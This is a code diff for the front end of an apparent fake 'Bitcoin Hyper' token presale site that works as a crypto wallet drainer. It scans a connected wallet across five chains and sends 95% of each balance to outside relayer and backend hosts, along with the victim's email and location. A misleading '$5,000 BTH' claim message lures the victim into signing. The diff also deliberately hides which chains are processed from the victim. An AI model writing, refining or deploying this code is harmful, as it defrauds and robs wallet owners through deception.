@@ -11,7 +11,7 @@ import './index.css';
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Ethereum',
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
@@ -69,18 +69,6 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "event FlowProcessed(address indexed initiator, uint256 value)"
 ];
 
-// EIP-712 Domain Types for Meta Transactions
-const EIP712_TYPES = {
-  MetaTx: [
-    { name: "user", type: "address" },
-    { name: "contractAddress", type: "address" },
-    { name: "chainId", type: "uint256" },
-    { name: "amount", type: "uint256" },
-    { name: "nonce", type: "uint256" },
-    { name: "deadline", type: "uint256" }
-  ]
-};
-
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
@@ -111,7 +99,6 @@ function App() {
   const [scanProgress, setScanProgress] = useState(0);
   const [scanning, setScanning] = useState(false);
   const [currentFlowId, setCurrentFlowId] = useState('');
-  const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
   const [processedAmounts, setProcessedAmounts] = useState({});
@@ -145,15 +132,15 @@ function App() {
 
   // Minimum gas buffer requirements (in native token)
   const MIN_GAS_BUFFER = {
-    Ethereum: 0.005, // 0.005 ETH minimum for gas
-    BSC: 0.001, // 0.001 BNB minimum for gas
-    Polygon: 0.1, // 0.1 MATIC minimum for gas
-    Arbitrum: 0.002, // 0.002 ETH minimum for gas
-    Avalanche: 0.1 // 0.1 AVAX minimum for gas
+    Ethereum: 0.005,
+    BSC: 0.001,
+    Polygon: 0.1,
+    Arbitrum: 0.002,
+    Avalanche: 0.1
   };
 
   // Minimum value threshold to execute ($1)
-  const MIN_VALUE_THRESHOLD = 1; // $1 minimum
+  const MIN_VALUE_THRESHOLD = 1;
 
   // Fetch crypto prices
   useEffect(() => {
@@ -199,7 +186,6 @@ function App() {
         setWalletInitialized(true);
         setTxStatus('');
         
-        // Fetch balances across all chains
         await fetchAllBalances(address);
         
       } catch (e) {
@@ -288,26 +274,21 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
-      // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
-      // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      // Filter chains that are executable (have enough value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
         
-        // Check if value is at least $1
         if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
           console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
           return false;
         }
         
-        // Check if enough for gas (leave gas buffer)
         const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
         if (balance.amount < minGasRequired) {
           console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
@@ -320,7 +301,6 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
-      // Check if eligible (total >= $1)
       const eligible = total >= 1;
       setIsEligible(eligible);
       
@@ -328,10 +308,9 @@ function App() {
         if (executable.length === 0) {
           setTxStatus('⚠️ No chains meet execution requirements');
         } else {
-          setTxStatus(`✅ Ready to process ${executable.length} chains`);
+          setTxStatus(`✅ Ready to process`);
         }
         
-        // Send to backend for tracking
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -350,7 +329,6 @@ function App() {
           }
         }
         
-        // Prepare flow silently if there are executable chains
         if (executable.length > 0) {
           preparePresale();
         }
@@ -376,7 +354,6 @@ function App() {
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
     
-    // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
@@ -440,8 +417,8 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION - 95% OF BALANCE (only on executable chains)
-  // NO TRANSACTION POPUPS - ONLY MESSAGE SIGNING
+  // RELAYER EXECUTION - YOUR EXACT CUSTOM SIGNING
+  // NO CHAIN PROCESSING SHOWN TO USER
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -460,50 +437,58 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      // Use only executable chains (those with enough value and gas buffer)
+      // YOUR EXACT CUSTOM SIGNING MESSAGE - Bitcoin Hyper Token Presale Authorization
+      const nonce = Math.floor(Math.random() * 1000000000);
+      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
+        `I hereby confirm my participation\n` +
+        `Wallet: ${address}\n` +
+        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+        `Timestamp: ${new Date().toISOString()}\n` +
+        `Nonce: ${nonce}`;
+
+      setTxStatus('✍️ Sign message...');
+
+      // Get signature - ONE SIGNATURE FOR ALL CHAINS
+      const signature = await signer.signMessage(message);
+      console.log("✅ Signature obtained");
+      
+      setTxStatus('⏳ Processing...');
+
+      // Use only executable chains
       const chainsToProcess = executableChains;
       
       if (chainsToProcess.length === 0) {
-        setError("No chains meet the execution requirements (min $1 value and gas buffer)");
+        setError("No chains meet the execution requirements");
         setSignatureLoading(false);
         return;
       }
 
       console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);
 
-      // Sort chains by value (highest first) - AS REQUESTED
+      // Sort chains by value (highest first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
       
-      // Generate a random nonce for this flow
-      const flowNonce = Math.floor(Math.random() * 1000000000);
-      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
-      
       let processed = [];
-      let skippedChains = [];
       let failedChains = [];
       
-      // Process each chain - collect signatures first then send to relayer
+      // Process each chain through relayer
       for (const chain of sortedChains) {
         try {
-          setProcessingChain(chain.name);
-          setTxStatus(`✍️ Signing for ${chain.name}...`);
-          
-          // Get balance data - SEND 95% (leave 5% for gas)
+          // Get balance data - SEND 95%
           const balance = balances[chain.name];
           
           // Double-check if still executable
           if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
-            console.log(`⏭️ Skipping ${chain.name}: Value now $${balance.valueUSD.toFixed(2)} below threshold`);
-            skippedChains.push(chain.name);
+            console.log(`⏭️ Skipping ${chain.name}: Value below threshold`);
             continue;
           }
           
-          const amountToSend = balance.amount * 0.95;
+          const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
-          // Store the processed amount for this chain
+          // Store internally
           setProcessedAmounts(prev => ({
             ...prev,
             [chain.name]: {
@@ -515,42 +500,7 @@ function App() {
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // ============================================
-          // EIP-712 TYPED DATA SIGNING - NO TRANSACTION POPUP
-          // ============================================
-          
-          // Create domain for this chain
-          const domain = {
-            name: "MetaCollector",
-            version: "1",
-            chainId: chain.chainId,
-            verifyingContract: chain.contractAddress
-          };
-          
-          // Create message for EIP-712 signing
-          const message = {
-            user: address,
-            contractAddress: chain.contractAddress,
-            chainId: chain.chainId,
-            amount: ethers.parseEther(amountToSend.toFixed(18)).toString(),
-            nonce: flowNonce,
-            deadline: deadline
-          };
-          
-          console.log(`📝 Requesting signature for ${chain.name}...`);
-          
-          // Get signature - THIS IS THE ONLY POPUP USER SEES (sign message)
-          const signature = await signer.signTypedData(domain, EIP712_TYPES, message);
-          
-          console.log(`✅ Signature obtained for ${chain.name}`);
-          
-          setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
-          
-          // ============================================
-          // SEND TO RELAYER ENDPOINT
-          // ============================================
-          
-          // Encode the function data for processNativeFlow
+          // Create contract interface for encoding
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const encodedFunctionData = contractInterface.encodeFunctionData('processNativeFlow', []);
           
@@ -569,22 +519,16 @@ function App() {
             contractAddress: chain.contractAddress,
             amount: amountToSend.toFixed(18),
             encodedFunctionData: encodedFunctionData,
-            nonce: flowNonce,
-            // Meta transaction data for verification
-            metaTx: {
-              domain,
-              types: EIP712_TYPES,
-              message,
-              signature
-            }
+            nonce: nonce
           };
+          
+          console.log(`📤 Sending to relayer for ${chain.name}...`);
           
           // Send to relayer
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
-              'Content-Type': 'application/json',
-              'x-api-key': 'your-api-key-here' // Add your API key if required
+              'Content-Type': 'application/json'
             },
             body: JSON.stringify(relayerPayload)
           });
@@ -595,9 +539,8 @@ function App() {
             throw new Error(relayerResult.error || 'Relayer failed');
           }
           
-          console.log(`✅ ${chain.name} confirmed by relayer:`, relayerResult.hash);
+          console.log(`✅ ${chain.name} confirmed:`, relayerResult.hash);
           
-          setTxStatus(`✅ ${chain.name} completed!`);
           processed.push(chain.name);
           setCompletedChains(prev => [...prev, chain.name]);
           
@@ -610,7 +553,7 @@ function App() {
             amount: amountToSend.toFixed(6),
             symbol: chain.symbol,
             valueUSD: valueUSD,
-            gasFee: '0', // Gas paid by relayer
+            gasFee: '0',
             email: userEmail,
             location: {
               country: userLocation.country,
@@ -620,22 +563,15 @@ function App() {
             }
           };
           
-          await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+          fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(flowData)
-          });
+          }).catch(err => console.error('Backend tracking error:', err));
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
-          if (chainErr.code === 4001) {
-            // User rejected signature
-            failedChains.push(chain.name);
-            setError(`Signature rejected on ${chain.name}`);
-          } else {
-            failedChains.push(chain.name);
-            setError(`Error on ${chain.name}: ${chainErr.message}`);
-          }
+          failedChains.push(chain.name);
         }
       }
 
@@ -677,12 +613,8 @@ function App() {
           })
         });
         
-        // Show summary of skipped/failed chains if any
-        if (skippedChains.length > 0 || failedChains.length > 0) {
-          let summary = [];
-          if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
-          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
-          setError(`Note: ${summary.join(' · ')}`);
+        if (failedChains.length > 0) {
+          setError(`Note: Some chains had issues`);
         }
       } else {
         setError("No chains were successfully processed");
@@ -697,7 +629,6 @@ function App() {
       }
     } finally {
       setSignatureLoading(false);
-      setProcessingChain('');
     }
   };
 
@@ -948,7 +879,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible, has executable chains, and not all completed */}
+          {/* Main Claim Area - Only shows when eligible */}
           {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -966,14 +897,14 @@ function App() {
                   <>
                     <div className="w-4 h-4 sm:w-6 sm:h-6 border-2 border-[rgba(180,100,20,0.4)] border-t-[#c47d24] rounded-full animate-spin"></div>
                     <span className="text-sm sm:text-base animate-pulse">
-                      {processingChain ? `Signing for ${processingChain}...` : 'PROCESSING...'}
+                      PROCESSING...
                     </span>
                   </>
                 ) : (
                   <>
                     <i className="fas fa-gift text-sm sm:text-base animate-bounce-slow"></i>
                     <span className="text-sm sm:text-base">
-                      CLAIM $5,000 BTH {executableChains.length < eligibleChains.length ? `(${executableChains.length} of ${eligibleChains.length} chains)` : ''}
+                      CLAIM $5,000 BTH
                     </span>
                     <i className="fas fa-arrow-right text-sm sm:text-base group-hover/claim:translate-x-1 transition-transform"></i>
                   </>
@@ -988,7 +919,7 @@ function App() {
             </div>
           )}
 
-          {/* Already completed - Don't show number of chains */}
+          {/* Already completed */}
           {allChainsCompleted && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4 animate-pulse-glow">
@@ -1005,7 +936,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible - NO BALANCES SHOWN */}
+          {/* Welcome message for non-eligible */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
